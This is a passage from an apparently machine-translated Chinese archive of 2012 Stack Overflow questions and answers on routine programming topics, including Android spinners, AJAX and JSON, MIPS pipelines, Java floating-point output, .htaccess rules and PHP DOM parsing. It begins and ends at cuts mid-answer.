    ArrayList tdata = new ArrayList<MyData>();
    MyData mdata =new MyData();
    mdata.setName("");
    mdata.setData("-1");
    MyData ndata =new MyData();
    ndata.setName("ciao belluzzo");
    ndata.setData("1");
    tdata.add(mdata);
    tdata.add(ndata);
    mdata= new MyData();
    mdata.setName("vai alla fnac");
    mdata.setData("2");
    tdata.add(mdata);
    mSpinner = (Spinner) findViewById(R.id.my_spinner);
    factory = LayoutInflater.from(this);

    populateSpinner(tdata);

    setUpAdapter();
    mSpinner.setSelected(false);
    try  {
        mAdapter.notify();
    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    //mAdapter.registerDataSetObserver(new MyObserver());
}
ArrayList<MyData> mData;
MyAdapter mAdapter = new MyAdapter(null);
Spinner mSpinner;
// This sets up the adapter and the arraylist that contains the data
private void setUpAdapter() {
    mSpinner.setOnItemSelectedListener(new Spinner.OnItemSelectedListener() {

        @Override
        public void onItemSelected(AdapterView<?> parent,
                View view, int pos, long id) {
                MyData g = (MyData) parent.getItemAtPosition(pos);
                // TODO
                Toast.makeText(OneCheckActivity.this , "selected item : " + pos + ", value: " + g.getData(),Toast.LENGTH_LONG).show();

            }
        @Override
            public void onNothingSelected(AdapterView parent) {
              // Do nothing.
            }

    });
}

  // this populates the arraylist that is attached to the spinner's adapter
  //it is called once an AsyncTask finishes pulling data from a local database
private void populateSpinner(ArrayList<MyData> result) {
    if (result != null) {
        if (mData == null) {
            mData = new ArrayList<MyData>();
        }
        else {
            mData.clear();
        }

        for (int index = 0; index < result.size(); index++) {
            mData.add(result.get(index));
        }
        mAdapter = new MyAdapter(mData);

        mSpinner.setAdapter(mAdapter);
    }
}

// this is the adapter for the spinner
private class MyAdapter implements SpinnerAdapter {

    ArrayList<MyData> data;

    public MyAdapter(ArrayList<MyData> data){
        this.data = data;
    }
    public void updateData(ArrayList<MyData> data){
        this.data = data;
    }

    @Override
    public int getCount() {
        return data.size(); 
        }

    @Override
    public Object getItem(int position) {
        return data.get(position);
    }

    @Override
    public long getItemId(int position) {
        return position;
    }

    @Override
    public int getItemViewType(int position) {
        return android.R.layout.simple_spinner_dropdown_item;
    }

    @Override
    public LinearLayout getView(int position, View convertView, ViewGroup parent) {
        LinearLayout pv = (LinearLayout)(factory.inflate(R.layout.spinner_item, null));
        TextView tv = (TextView) pv.findViewById(R.id.textviewid);
        tv.setTextColor(Color.BLACK);
        MyData item = data.get(position);
        tv.setText( item.getName() + " - " + item.getData() + " ");
        tv.setPadding(0, 20, 0, 20);
        return pv;
    }

    @Override
    public int getViewTypeCount() {
        return 1;
    }

    @Override
    public boolean hasStableIds() {
        return false;
    }

    @Override
    public boolean isEmpty() {
        return data.isEmpty();
    }

    @Override
    public void registerDataSetObserver(DataSetObserver observer) {
        // TODO Auto-generated method stub

    }

    @Override
    public void unregisterDataSetObserver(DataSetObserver observer) {
        // TODO Auto-generated method stub
    }

    @Override
    public LinearLayout getDropDownView(int position, View convertView, ViewGroup parent) {
        if (convertView instanceof LinearLayout) System.out.println("%%%%%%%%%%%%%%55555 hai ragione");
        return this.getView(position, convertView, parent);
    }
}

} 
```

将此用作 spinner_item.xml 的布局

```
<?xml version="1.0" encoding="UTF-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
>

<TextView 
android:layout_width="fill_parent"
android:layout_height="wrap_content"
android:gravity="center"
android:textSize="28px"
android:id="@+id/textviewid"
/>

</LinearLayout> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-18T19:42:42.613

您可以使用 xml 属性设置静态大小`android:layout_height`。建议使用 dp 单位而不是 px 以实现多屏幕兼容性。

至于文本，请尝试`android:prompt`在 Spinner xml 中使用属性。对于颜色，我猜它就像其他小部件一样，只需使用`android:textColor`

# ajax - 我该怎么做呢？

> ID：10658735
> 
> 赞同：-2
> 
> 时间：2012-05-18T19:36:09.447
> 
> 标签：ajax, xmlhttprequest, json

首先，我在 json_encode 函数中编码了我的数据。

例如，看起来像这样：

```
{"test":"test value"} 
```

我想要做的是将测试变成一个javascript变量，它可以保存“测试值”的数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T20:57:24.557

```
$.getJSON('ajax/test.json', function(data) {
  var items = [];

  $.each(data, function(key, val) {
    items.push('<li id="' + key + '">' + val + '</li>');
  });

  $('<ul/>', {
    'class': 'my-new-list',
    html: items.join('')
  }).appendTo('body');
}); 
```

直接来自 jquery 文档...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T21:21:34.293

对象是关联数组。它们存储键/值对。所以你所要做的就是：

```
var test = function(){}
test["hello"] = "world"; 
```

这将设置`hello`为变量`world`及其值。你可以通过这样做来测试这个

```
alert(test.hello); 
```

用json 键和值替换`hello`and`world`

希望这对这个例子有更多帮助：我正在使用 Jquery AJAX 去 index.php 资源并返回一个 json 对象。

索引.php

```
<?php
$variables = array('hello' => 'world');
echo json_encode($variables);
?> 
```

例子.html

```
var test = function(){}
$.ajax({
   url: index.php,
   success: function(json) {
    for(var key in json ){
     var testVarName = key;
     var testVarValue = json[key];
     test[testVarName ] = testVarValue;
    }
}
}); 
```

所以现在`test`对象有变量`hello`，它的值是`world`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T21:37:20.507

index.php（`json_encode`在这里使用）：

```
<?php
  $foo = array('test' => 'test value');
  echo json_encode($foo);
?> 
```

例子.html

```
<script type="text/javascript">

  $.get('index.php', function(response) {
    alert(response['test']);
    // this will alert "test value"
  }, 'json');

</script> 
```

* * *

**EDIT1**：example.html *（无jQuery解决方案*）：

```
<script type="text/javascript">

window.onload = function() {
    var request;
    request = getHTTPObject();
    request.onreadystatechange = sendData;
    request.open("GET", "index.php", true);
    request.send(null);
}

function sendData() {
    if(request.readyState == 4){
    var JSONtext = request.responseText;
    var JSONobject = JSON.parse(JSONtext);

    // notice how variables are used
    var output = JSONobject.test;

    alert(output); // displays "test value"
}

function getHTTPObject(){
    var xmlhttp = false;
    if(window.XMLHttpRequest){
        xmlhttp = new XMLHttpRequest();
    } else if (window.ActiveXObject) {
        try{
            xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
        }
        catch(e){
            try{
                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
            }
            catch(e) {
                xmlhttp = false;
            }
        }
    }
    return xmlhttp;
}
</script> 
```

# computer-science - 流水线数据路径

> ID：10658739
> 
> 赞同：1
> 
> 时间：2012-05-18T19:36:41.493
> 
> 标签：computer-science, pipeline, computer-architecture

我正在学习“管道数据路径”课程，我发现这三个术语“符号扩展偏移，分支地址，零信号”与管道寄存器 ID/EX 和 ID/MEM 有关，但我对这三个一无所知. 任何人都可以简单地解释这三个术语。很难从网上获得简单的想法，因为我只是一个初学者。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:20:49.743

它们都与 I 型 MIPS 分支指令有关，该指令比较一个或 2 个寄存器的值，如果它们不相等则进行分支。

MIPS PC 的长度为 32 位，但分支指令只有 16 位的相对地址。如果出现分支，则需要将这 2 个相加来计算新的 PC 值。为此，16 位地址扩展为 32 位（符号扩展 + 左移 2 个位置）。

这是**符号扩展偏移量**，然后将其添加到当前 PC 以获得目标地址（**分支地址**）。

分支条件由 ALU 单元检查，如果需要，它将断言**零信号。**然后，这个零信号由来自控制单元的分支信号选通，而这 2 个信号控制选择将写入 PC 的新值的多路复用器。

如果零信号为 1 且当前指令为分支指令，则 PC 将加载计算的分支地址，否则 PC +4。

# exchange-server - 如何以自动方式更改 Exchange 用户的密码

> ID：10658743
> 
> 赞同：1
> 
> 时间：2012-05-18T19:37:30.327
> 
> 标签：exchange-server, exchangewebservices, change-password

我有一个使用 EWS 托管 API 1.2 的应用程序。我们的 Exchange Server 管理员已经为我们设置了一个分配给我们服务帐户的邮箱。在连接和执行基本功能方面一切都很花哨。我们遇到的问题是，根据政策，他们不会选中密码永不过期的复选框。因此，我们今天必须通过手动过程来重置密码。

我们的愿望是自动更改密码，这样我们的应用程序就不会遭受任何撤消分离焦虑，因此我们不必承受文书工作和协调来更改密码的负担。有没有办法以自动方式更改密码？

预警系统？肥皂？电源外壳？？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T18:41:30.777

可能还有其他方法，但是您可以使用 Powershell 脚本创建调度程序任务，每 15 天运行一次并更新密码：

```
Set-Mailbox user_name@user_domain.com -Password (ConvertTo-SecureString -String 'new_password' -AsPlainText -Force) 
```

一旦安排了 Powershell 任务，它将根据设置运行并将密码更新到您的帐户。您还可以根据月或周模式或其他一些逻辑生成唯一的密码字符串，因此无需记住，它将与以前的不同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T00:16:45.410

您可以对 AD 进行简单的 ADSI 调用并调用 ChangePassword 来执行此操作。

# javascript - Javascript：如何检查是否分配了按钮的单击功能

> ID：10658744
> 
> 赞同：1
> 
> 时间：2012-05-18T19:37:30.807
> 
> 标签：javascript, backbone.js, onclick

我知道有人问过这个问题，但这**与那个问题不同**。我试图用**Javascript**来解决它。

问题与我的**backbone.js**应用程序有关，我已将其简化为最简单的形式，但无法让**事件**正常工作。任何建议将不胜感激。

我的代码：

```
<!DOCTYPE HTML>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <title>Learning About Backbone.js Views</title>
    <style type="text/css">
        #container { padding:20px; border:1px solid #333; width:400px; }
        #list-template { display:none; }
    </style>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script type="text/javascript" src="http://documentcloud.github.com/underscore/underscore-min.js"></script>
<script type="text/javascript" src="http://documentcloud.github.com/backbone/backbone-min.js"></script>

    <script type='text/javascript'>
      var ListView=Backbone.View.extend({
        initialize:function(){
            console.log('initialized');
        },
        el:'body',
        events:{
            'click #add':'time',
            'click':'whatApp'
        },
        time: function()
        {
            console.log('hooooooop');
        },
        whatApp:function()
        {
            console.log('Coool');
        }
      });
      var listView = new ListView();
    </script>
</head>
<body>
<button id='add'>Add list item</button>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T20:35:05.333

你在做什么没有错。您正在尝试在主体（或 dom）存在之前初始化视图。您应该在加载 dom**后**初始化视图：

```
$(function(){
  var listView = new ListView();
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:48:43.443

使用 jQuery，您应该能够使用 Data API 来查看事件和分配的函数：

```
$('#add').data('events') 
```

# macos - 确定互联网速度

> ID：10658745
> 
> 赞同：1
> 
> 时间：2012-05-18T19:37:31.860
> 
> 标签：macos, cocoa

我的应用程序（OS X，10.7 目标）是否可以在**不下载文件的情况下**确定互联网连接速度？这里的所有其他问题似乎都是下载文件。我的应用程序是一个菜单栏应用程序，因此每隔一段时间下载一个文件似乎效率很低（即使很小）。

有任何想法吗？我可以被动地观察系统上的传入字节吗？如果是这样，我需要研究哪些框架？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T19:50:40.097

OSX 不是我的专业领域，但这应该适用于所有类似的情况。

您*可以*“被动观察字节”通过系统，这将为您提供一般使用的网络吞吐量的良好图表（即，您使用了多少互联网连接），但这**不会为您提供*****实际***的示例***网络速度***。

例如，大多数网络流量很小且分散，随机进出不同的应用程序。通过这种一般用法，您无法确定网络能够做什么，因为您不会通过浏览互联网或在 Skype 上聊天等来接近达到这一目标。

为了找出你的网络有多快，你需要达到它的极限（饱和）——为了做到这一点，你需要找到一个固定数量的大小适中的数据，看看需要多长时间才能达到转移。文件越大（在一定程度上），您对网络速度的计算就越准确。（显然，因为你取平均值，你必须处理的输入数据越多，你的计算就越精确）

**tl;博士？**计算网络速度是一项昂贵的操作。你不能只监控网络使用情况，因为它不会给你任何有用的东西。

# c# - id键自动递增时如何保存新记录

> ID：10658748
> 
> 赞同：0
> 
> 时间：2012-05-18T19:37:38.603
> 
> 标签：c#, ado.net, insert, auto-increment

我在 sql server 2008 中创建了一个数据库和一个带有自动增量 id 字段的表

我也在 c#.net 2008 中开发了一个项目

在 BindingNavigator 的“添加新”之后单击“保存数据”会出现问题

例如，我单击“添加新”，填写除 id 文本（空白 id）以外的所有字段，然后单击“保存数据”，然后出现错误

运行时异常是“notNullAllowedException：列 'id' 不允许为空。

但用户不需要填写此字段，但必须在保存后从数据库中返回

我还设置了id的属性：（c#项目和sql server）

```
AutoIncrement = True
AutoIncrementStep = -1 (also I tested 1)
AutoIncrementSeed = -1 (also I tested 1) 
```

没有结果。

我怎么能处理呢？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T19:45:49.527

不要在插入语句中包含标识列。

如果你的陈述是

```
INSERT INTO MyTable (ID, SomeField, SomeOtherField) VALUES (null, 'SomeValue', 'AnotherValue') 
```

只需将其更改为

```
INSERT INTO MyTable ( SomeField, SomeOtherField) VALUES ( 'SomeValue', 'AnotherValue') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:49:11.830

听起来你有两个问题。

首先，您总是在插入 - 您使用什么逻辑来决定“保存”应该是插入还是更新？我认为这是因为您遇到的错误：“无法插入显式...”

其次，您需要获取 SQL 在插入时分配的 ID，以便将其写入 ID 字段以进行下一次保存 = 更新。有几种方法可以做到这一点，我更喜欢的方法是使用存储过程进行插入并传递获取 SCOPE_IDENTITY() 的 OUTPUT 参数。像这样的东西：

```
CREATE PROC xyz
(
    @data...
    @NEWID INT OUTPUT
)
AS
    ... do your INSERT ...
    SET @NewID = SCOPE_IDENTITY()

) 
```

仔细检查我的语法 - 不确定您使用的是什么版本的 SQL

# list - Scala 列表 toString()

> ID：10658750
> 
> 赞同：0
> 
> 时间：2012-05-18T19:37:42.663
> 
> 标签：list, scala

我有一个`List[List[]]`

```
List(List(1,2), List(3,4)) 
```

如果我打电话`toString()`给它

`List(List(1,2), List(3,4)).toString()`

如果可以，是否可以恢复原件`List[List[]]`，如何？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:47:35.207

你只想解析你得到的字符串`toString`吗？如果是这样，则没有本地方法可以做到这一点（例如 Python`eval`或 Haskell 的），但您可以使用[Scala 解析器组合库](http://www.scala-lang.org/api/current/scala/util/parsing/combinator/RegexParsers.html)`read`轻松实现自己的功能：

```
import scala.util.parsing.combinator._    

object parseIntListList extends RegexParsers {
  def list = "List(" ~> repsep("\\d+".r ^^ (_.toInt), ",") <~ ")"
  def apply(s: String) = parse("List(" ~> repsep(list, ",") <~ ")", s)
} 
```

现在`parseIntListList(List(List(1, 2), List(3, 4)).toString)`做你想要的，解析器对额外的空白等很健壮。

不过，几乎可以肯定，在 Scala 中做任何你想做的事情都有更好的方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T23:26:37.907

在 Scala 中，与在 Java 中（甚至 Python，尽管库通常保持约定）一样，并不能保证 a`.toString`会产生一个经过编译后会重新创建对象的东西。事实上，常见类型如`Long`和`String`不会产生可用于重新创建它们的字符串输出。

请注意，产生可用于重新创建实例的输出的标准方法是通过*序列化*。如果这就是你想要的，请查一下。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-19T00:45:03.657

你知道它是一个 Int 列表吗？

```
val li = List(List(1,2), List(3,4))
val s = li.toString 

s.replaceAll ("[^0-9) ]", "").split ("\\)").map(_.split (" ").filterNot (_.equals ("")).map (_.toInt).toList).toList
res86: List[List[Int]] = List(List(1, 2), List(3, 4)) 
```

# java - Java 中的 Math.pow 给出了意想不到的小数精度

> ID：10658751
> 
> 赞同：2
> 
> 时间：2012-05-18T19:37:43.117
> 
> 标签：java, python, clojure

请有人帮我处理java浮点数。我观察到一些与 java 的不一致之处，例如

```
Math.pow(10.0,-2)==0.01
Math.pow(10.0,-3)=0.0010 (instead of 0.001)
Math.pow(10.0,-4)=1.0 E-4
printf("%g",Math.pow(10,-4)) =0.000100000 
```

而使用 Python：

```
10**-1=0.1
10**-2=0.01
10**-3=0.001 
```

使用 Clojure 1.4

```
(Math/pow 10 -2) = 0.01
(Math/pow 10 -3) = 0.001 
```

我的问题是如何在 Java 中获得类似的结果，与 Python 相比，换句话说，我如何获得没有任何尾随零的确切结果。为什么要添加这些尾随零，有什么方法可以抑制它们。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T20:09:40.783

很容易解释尾随零的来源。

因为`%g`它很简单：`%g`默认情况下总是显示 6 个有效数字，所以你会看到

```
1.00000
0.100000
0.0100000
0.00100000
0.000100000
1.00000e-5
1.00000e-6
... 
```

您可以通过将精度设置为 1 个有效数字来消除它们，但您可能不想这样做，因为这也会将 2.5 舍入到 3，例如。

执行 a`println`直接显示结果 (a `double`) 的表示，如 定义[`Double.toString()`](http://docs.oracle.com/javase/7/docs/api/java/lang/Double.html#toString%28double%29)：

> 结果是一个字符串，表示参数的符号和大小（绝对值）。[...] 量级*m*：

[...]

> 如果*m*大于或等于 10 ^(-3)但小于 10 ⁷，则表示为*m*的整数部分，以十进制形式表示，不带前导零，后跟“.”。('\u002E')，后跟一个或多个小数位，表示*m*的小数部分。

[...]

> 如果*m*小于 10 ^(-3)或大于或等于 10 ⁷，则它以所谓的“计算机科学计数法”表示。令*n*为唯一整数，使得 10 ^(*n*) ≤ *m* < 10 ^(*n* +1)；然后让*a*是*m*和 10 ^(*n*)的数学精确商，使得 1 ≤ *a* < 10。然后将大小表示为 a 的整数部分*，*作为一个十进制数字，后跟“。” ('\u002E')，后跟表示 a 的小数部分的十进制*数字*，后跟字母 'E' ('\u0045')，后跟*n*表示为十进制整数，由方法 生成`Integer.toString(int)`。

[...]

> *m*或*a*的小数部分必须打印多少位？必须至少有一个数字来表示小数部分，除此之外，必须有尽可能多的数字，但只需要将参数值与相邻的 double 类型值唯一区分开来。

因此你看到

```
1.0
0.01
0.0010
1.0E-4
9.999999999999999E-6
1.0E-6
... 
```

**那么如何摆脱尾随零呢？**

一种方法是使用`BigDecimal`，它有一个[`stripTrailingZeros()`](http://docs.oracle.com/javase/7/docs/api/java/math/BigDecimal.html#stripTrailingZeros%28%29)方法。但是你必须小心你如何使用它：

```
System.out.println(BigDecimal.TEN.pow( -4 ,MathContext.DECIMAL64).stripTrailingZeros()); 
```

将打印预期的

```
0.0001 
```

但

```
System.out.println(new BigDecimal(Math.pow(10,-4)).stripTrailingZeros()); 
```

将打印

```
0.000100000000000000004792173602385929598312941379845142364501953125 
```

因为这恰好`double`是最接近 10 ^(-4)的确切值。

如果你不想在`BigDecimal`s 中做所有的数学运算，那么你可以得到一个四舍五入结果的字符串表示形式`%g`（这让你有机会控制精度），从中得出一个`BigDecimal`结果，然后打印结果：

```
System.out.println(new BigDecimal( String.format("%g", Math.pow(10,-4) ) ).stripTrailingZeros()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:44:23.113

如果您的问题只是显示，您可以使用 DecimalFormat 和 '#' [http://docs.oracle.com/javase/7/docs/api/java/text/DecimalFormat.html](http://docs.oracle.com/javase/7/docs/api/java/text/DecimalFormat.html)

# php - 如果 echo 语句中的值为 2，则显示文本？

> ID：10658752
> 
> 赞同：0
> 
> 时间：2012-05-18T19:37:44.563
> 
> 标签：php

我有以下 echo 语句显示会话中的数值：

```
<?php echo(str_replace('"', '&quot;', $row_WAATKgblqemplisting['Group'])); ?> 
```

我如何更改此语句，以便如果`$row_WAATKgblqemplisting['Group']`

等于2 它说：这是#2 如果它等于1 它说：这是#1，如果它等于3 它说：这是#3？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:42:00.730

```
echo 'This is #' . $row_WAATKgblqemplisting['Group']; 
```

如果写入 HTML，您可以使用实体`&#35;`而不是 ASCII`#`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:41:43.240

```
$number =  $row_WAATKgblqemplisting['Group'];
echo 'This is &#35;'.$number; 
```

那是你想要做的吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T19:44:45.077

```
echo "This is #{$row_WAATKgblqemplisting['Group']}\n"; 
```

# javascript - 多文件上传：Javascript 和 SQL 插入

> ID：10658753
> 
> 赞同：0
> 
> 时间：2012-05-18T19:37:48.147
> 
> 标签：javascript, oracle, plsql, oracle-apex

使用以下 HTML 输入和 Javascript，用户最多可以向页面添加 3 个文件。

文件上传输入代码：

```
 <input id="my_file_element" type="file" name="file_1" >
    <input type="submit">
Files:
<div id="files_list"></div>
<script> 
    var multi_selector = new MultiSelector( document.getElementById( 'files_list' ), 3 );
    multi_selector.addElement( document.getElementById( 'my_file_element' ) );
</script> 
```

HTML 标头中的 JavaScript：

```
<script language="javascript"> 

    function MultiSelector( list_target, max ){

    this.list_target = list_target;

    this.count = 0;

    this.id = 0;

    if( max ){
        this.max = max;
    } else {
        this.max = -1;
    };

    this.addElement = function( element ){

        if( element.tagName == 'INPUT' && element.type == 'file' ){

            element.name = 'file_' + this.id++;

            element.multi_selector = this;

            element.onchange = function(){

                var new_element = document.createElement( 'input' );
                new_element.type = 'file';

                this.parentNode.insertBefore( new_element, this );

                this.multi_selector.addElement( new_element );

                this.multi_selector.addListRow( this );

                this.style.position = 'absolute';
                this.style.left = '-1000px';

            };

            if( this.max != -1 && this.count >= this.max ){
                element.disabled = true;
            };

            this.count++;

            this.current_element = element;

        } else {
            alert( 'Error: not a file input element' );
        };

    };

    this.addListRow = function( element ){

        var new_row = document.createElement( 'div' );

        var new_row_button = document.createElement( 'input' );
        new_row_button.type = 'button';
        new_row_button.value = 'Delete';

        new_row.element = element;

        new_row_button.onclick= function(){

            this.parentNode.element.parentNode.removeChild( this.parentNode.element );

            this.parentNode.parentNode.removeChild( this.parentNode );

            this.parentNode.element.multi_selector.count--;

            this.parentNode.element.multi_selector.current_element.disabled = false;

            return false;
        };

        new_row.innerHTML = element.value;

        new_row.appendChild( new_row_button );

        this.list_target.appendChild( new_row );

    };

};
    </script> 
```

如何使用 Pl/SQL 将 blob 文件（最多 3 个）插入 Oracle DB？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T09:19:08.940

真是一罐蠕虫。我环顾四周，我只能告诉你，你想做的事情一点也不容易。您必须解决几个问题。但是，如果您有兴趣，一个勇敢的人[提供了一个可用于多文件上传的插件](http://www.theapexfreelancer.com/apex/f?p=APEXFREELANCER%3aFILE_UPLOAD)（有偿）。

主要问题是 Apex 无法通过 AJAX 处理文件上传。从插件的文档中，您可以收集到一些信息：文件以块的形式处理，最后进行重建。在 IE（和非 html5 浏览器（和 IE9 也没有 FileReader 对象））中，文件通过单独的页面和 iframe 逐个处理。想必，这个页面有一个文件浏览项。我相信文件也会立即上传。

另一种方法可能是[通过 apex listener](http://monkeyonoracle.blogspot.com/2011/10/multiple-file-upload-with-jquery-and.html)。尽管在这里您必须弄清楚更多才能使其正常工作。

但是，当您说“上传文件（最多 3 个）”时，这是否意味着您最多只能上传 3 个文件？在这种情况下，为什么不创建 3 个文件浏览项，然后动态显示/隐藏它们呢？省去尝试模仿多文件插件的麻烦。

如果您确实需要，最好的方法可能是使用额外的页面，尤其是在使用 IE 时。

在 HTML5 浏览器中，您可以在 javascript 中尝试 FileReader 对象，读取文件并对其进行编码，然后将其分块处理并通过 plsql 将其重新组合到服务器端。有关这方面的更多信息，请查看[Reading local files in javascript](http://www.html5rocks.com/en/tutorials/file/dndfiles/)和[Html5 File Upload with Progress](http://www.matlus.com/html5-file-upload-with-progress)。

# apache - htaccess：如何拒绝对现有目录的完全访问？

> ID：10658754
> 
> 赞同：0
> 
> 时间：2012-05-18T19:37:51.450
> 
> 标签：apache, .htaccess, directory, rewrite

如何拒绝访问 .htaccess 中的目录？

我不是指目录列表，而是指目录中的所有内容以及目录本身？它应该给出 503 或 404 错误。

我正在谈论`/img-sys`并且`/java-sys`显然不存在（我没有创建它们），但在访问时仍然给出白屏而不是 404 错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T20:00:12.630

把它放在`.htaccess`文件的顶部：

```
RewriteRule ^(img-sys|java-sys) - [R=404] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-19T00:54:21.373

这会做到的。它只会因`403 Forbidden`HTTP 响应代码而失败。把它放在你的`VirtualHost`块中：

```
<LocationMatch "/(img|java)-sys">
  Order allow,deny
  Deny from all
</LocationMatch> 
```

# java - UnmarshalException：解析引用类型的 xml 时出现意外元素

> ID：10658767
> 
> 赞同：1
> 
> 时间：2012-05-18T19:39:13.380
> 
> 标签：java, xml, xsd, jaxb, unmarshalling

**例外：**

> javax.xml.bind.UnmarshalException：意外元素（uri：“http://xxx.com/xxxServices/response”，本地：“A”）。预期的元素是 <{http://xxx.com/xxxServices/common/acknowledgement}I>

**XSD 用于使用 xjc 生成 java 类：**

```
<xs:import namespace="http://xxx.com/xxxServices/common/acknowledgement" schemaLocation="../common_acknowledgement_v1.0.xsd"/>  
<xs:element name="A" type="abr:AType">  
</xs:element>  
</xs:schema> 
```

**我正在尝试解析的示例 XML：**

```
<ns0:A xmlns:ns0="http://xxx.com/xxxServices/response" xmlns:ns1="http://xxx.com/xxxServices/common/acknowledgement">  
 <ns1:I  UID="24" Type="Sequential"/>  
 <ns1:S>  
 <ns1:Date  Year="2012" Month="05" Day="15"/>  
 <ns1:Time  Hour="3" Minute="31" Second="54"/>  
 </ns1:S>  
 <ns1:AAck>  
 <ns1:I  UID="24" Type="Sequential"/>  
 <ns1:B>eDUA</ns1:B>  
 <ns1:AckResult>Received</ns1:AckResult>  
 <ns1:P>47</ns1:P>  
 </ns1:AAck>  
 </ns0:A> 
```

我曾经使用`JAXBIntrospector`从`unmarshal()`.

另外，我注意到 jaxb 将 @XmlRootElement 标记放在另一个生成的类上，`Ack`而不是放在`AType`实际上应该是 RootElement 的类上。我已经从 over `Ack`to中删除了注释，`AType`并检查了：

```
@XmlRootElement(name="A", namespace="http://xxx.com/xxxServices/response") 
```

&

```
@XmlRootElement(name="AType") 
```

我也检查`@XmlRootElement`过`Ack`它的生成方式。我在哪里和在做什么！

# php - 如何使用 preg_replace 删除整个 div

> ID：10658770
> 
> 赞同：0
> 
> 时间：2012-05-18T19:39:55.140
> 
> 标签：php, html, html-parsing

好的，因为它是 WordPress 问题，遗憾的是它更深了一点，我需要删除父 div 及其内部的每个表示：

```
<div class="sometestclass">
   <img ....>
   <div>.....</div>
   any other html tags
</div><!-- END: .sometestclass --> 
```

我唯一的想法是匹配以下开头的所有内容：

```
<div class="sometestclass"> 
```

并以：

```
<!-- END: .sometestclass --> 
```

介于两者之间（无论如何我都可以标记父 div 的结尾，这只是一个示例）。任何人都知道如何做到这一点：

```
<?php $content = preg_replace('?????','',$content); ?> 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-18T19:42:16.873

我不会使用正则表达式。相反，我会使用[DOMDocument](http://www.php.net/manual/en/class.domdocument.php)类。只需找到`div`该类的所有元素，并将它们从其父级中删除：

```
$html = "<p>Hello World</p>
         <div class='sometestclass'>
           <img src='foo.png'/>
           <div>Bar</div>
         </div>";

$dom = new DOMDocument;
$dom->loadHTML( $html );

$xpath = new DOMXPath( $dom );
$pDivs = $xpath->query(".//div[@class='sometestclass']");

foreach ( $pDivs as $div ) {
  $div->parentNode->removeChild( $div );
}

echo preg_replace( "/.*<body>(.*)<\/body>.*/s", "$1", $dom->saveHTML() ); 
```

结果是：

```
<p>Hello World</p> 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-18T20:33:05.763

```
<?php $content = preg_replace('/<div class="sometestclass">.*?<\/div><!-- END: .sometestclass -->/s','',$content); ?> 
```

我的 RegEx 有点生疏，但我认为这应该可以。请注意，正如其他人所说，RegEx 没有适当地处理 HTML 的某些复杂性。

此外，这种模式不会找到`div`带有 class 的嵌入元素`sometestclass`。你需要递归。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T19:44:42.583

只是一些 CSS`.sometestclass{display: none;}`怎么样？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-31T12:40:49.233

对于 UTF-8 问题，我在[PHP 手册中找到了一个 hack](http://www.php.net/manual/en/domdocument.loadhtml.php#95251)

所以我的功能如下：

```
function rem_fi_cat() {
/* This function removes images from _within_ the article.
 * If these images are enclosed in a "wp-caption" div-tag.
 * If the articles are post formatted as "image".
 * Only on home-page, front-page an in category/archive-pages.
 */
if ( (is_home() || is_front_page() || is_category()) && has_post_format( 'image' ) ) {
    $document = new DOMDocument();
    $content = get_the_content( '', true );
    if( '' != $content ) {
        /* incl. UTF-8 "hack" as described at 
         * http://www.php.net/manual/en/domdocument.loadhtml.php#95251
         */
        $document->loadHTML( '<?xml encoding="UTF-8">' . $content );
        foreach ($doc->childNodes as $item) {
            if ($item->nodeType == XML_PI_NODE) {
                $doc->removeChild($item); // remove hack
                $doc->encoding = 'UTF-8'; // insert proper
            }
        }
        $xpath = new DOMXPath( $document );
        $pDivs = $xpath->query(".//div[@class='wp-caption']");

        foreach ( $pDivs as $div ) {
            $div->parentNode->removeChild( $div );
        }

        echo preg_replace( "/.*<div class=\"entry-container\">(.*)<\/div>.*/s", "$1", $document->saveHTML() );

    }
} 
```

}

# django - Django if 语句不正确

> ID：10658773
> 
> 赞同：1
> 
> 时间：2012-05-18T19:40:26.263
> 
> 标签：django, django-templates

我不确定我哪里出了问题。我有一个循环打印出几个电子邮件地址。我想根据它的主要状态将一个设置为“主要”地址。如果我给模板 {{ x.primary }} 我得到 True 或 False 的值。

我希望我的输出看起来像：

*   工作：bob@example.com（小学）
*   个人：bob2@example.com
*   个人：bob3@example.com

* * *

```
<ul>
{% for x in member.person.email_addresses.all %}
    {% if x.publish %}
